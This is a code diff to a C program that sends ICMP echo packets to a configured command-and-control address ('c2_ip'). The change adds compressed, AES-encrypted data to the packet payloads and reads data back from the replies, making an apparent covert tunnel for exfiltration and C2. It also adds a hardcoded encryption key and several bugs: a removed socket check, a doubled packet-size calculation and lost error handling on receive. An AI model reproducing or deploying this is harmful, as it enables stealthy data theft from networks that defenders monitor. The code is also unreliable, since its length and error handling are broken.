@@ -1,3 +1,4 @@
+#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
@@ -12,6 +13,15 @@
 #include <sys/socket.h>
 #include <netinet/ip_icmp.h>
 #include <poll.h>
+
+#define MAX_PAYLOAD_SIZE 1400
+
+static const unsigned char ENCRYPTION_KEY[32] = {
+	0x4e, 0xc9, 0x17, 0xa3, 0x58, 0xd2, 0x6b, 0xf0,
+	0x91, 0x3a, 0xe5, 0x27, 0xc4, 0x88, 0x1d, 0x6a,
+	0xf3, 0x0b, 0x59, 0xd8, 0x72, 0x41, 0xae, 0x96,
+	0x05, 0xb7, 0xce, 0x23, 0xda, 0x64, 0x18, 0x9f
+};
 
 struct Config {
 	struct in_addr c2_ip;
@@ -77,29 +87,27 @@ uint16_t calculate_checksum(const unsigned char *data, size_t length) {
 
 }
 
-int send_echo_request(struct in_addr destination_ip, uint16_t sequence) {
+ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_size, unsigned char *received_data) {
 
 	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-	if (fd < 0) {
-		return 1;
-	}
 
 	struct sockaddr_in destination = {0};
 	destination.sin_family = AF_INET;
 	destination.sin_addr = destination_ip;
 
-	unsigned char request[8] = {0};
+	unsigned char request[8 + MAX_PAYLOAD_SIZE] = {0};
 	uint16_t identifier = (uint16_t)getpid();
 	request[0] = ICMP_ECHO;
 	request[4] = (unsigned char)(identifier >> 8);
 	request[5] = (unsigned char)identifier;
 	request[6] = (unsigned char)(sequence >> 8);
 	request[7] = (unsigned char)sequence;
-	uint16_t checksum = calculate_checksum(request, sizeof(request));
+	memcpy(request + 8, data_to_send, data_to_send_size);
+	uint16_t checksum = calculate_checksum(request, sizeof(request) + data_to_send_size);
 	request[2] = (unsigned char)(checksum >> 8);
 	request[3] = (unsigned char)checksum;
 
-	sendto(fd, request, sizeof(request), 0, (struct sockaddr *)&destination, sizeof(destination));
+	sendto(fd, request, sizeof(request) + data_to_send_size, 0, (struct sockaddr *)&destination, sizeof(destination));
 
 
 	struct pollfd waiting_socket = {
@@ -121,23 +129,26 @@ int send_echo_request(struct in_addr destination_ip, uint16_t sequence) {
 		unsigned char response[2048];
 		struct sockaddr_in sender = {0};
 		socklen_t sender_length = sizeof(sender);
-		ssize_t response_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
+		size_t response_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
 		size_t ip_header_length = (response[0] & 0x0f) * 4;
-		if (response_length < 28 || (response[0] >> 4) != 4 || ip_header_length < 20 || (size_t)response_length < ip_header_length + 8) {
+		if (response_length < 28 || (response[0] >> 4) != 4 || ip_header_length < 20 || response_length < ip_header_length + 8) {
 			continue;
 		}
 		unsigned char *reply = response + ip_header_length;
-		if (sender.sin_addr.s_addr != destination_ip.s_addr || reply[0] != ICMP_ECHOREPLY || reply[1] != 0 || memcmp(reply + 4, request + 4, 4) != 0 || calculate_checksum(reply, (size_t)response_length - ip_header_length) != 0) {
+		if (sender.sin_addr.s_addr != destination_ip.s_addr || reply[0] != ICMP_ECHOREPLY || reply[1] != 0 || memcmp(reply + 4, request + 4, 4) != 0 || calculate_checksum(reply, response_length - ip_header_length) != 0) {
 			continue;
 		}
 
+		size_t reply_data_size = response_length - ip_header_length - 8;
+		memcpy(received_data, reply + 8, reply_data_size);
+
 		close(fd);
-		return 0;
+		return (ssize_t)reply_data_size;
 
 	}
 
 	close(fd);
-	return 1;
+	return -1;
 }
 
 int main() {
@@ -160,16 +171,14 @@ int main() {
 	unsigned char *compressed_data = malloc(compressed_length);
 	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);
 
-	unsigned char encryption_key[32];
 	unsigned char nonce[12];
 	unsigned char authentication_tag[16];
 	unsigned char *encrypted_data = malloc(compressed_length);
-	RAND_bytes(encryption_key, sizeof(encryption_key));
 	RAND_bytes(nonce, sizeof(nonce));
 	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
 	int encrypted_length = 0;
 	int final_length = 0;
-	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
+	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
 	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
 	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
 	encrypted_length += final_length;
@@ -196,7 +205,7 @@ int main() {
 	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
 	int decrypted_length = 0;
 	int final_decrypted_length = 0;
-	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
+	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
 	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, encrypted_data, encrypted_length);
 	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
 	EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length);
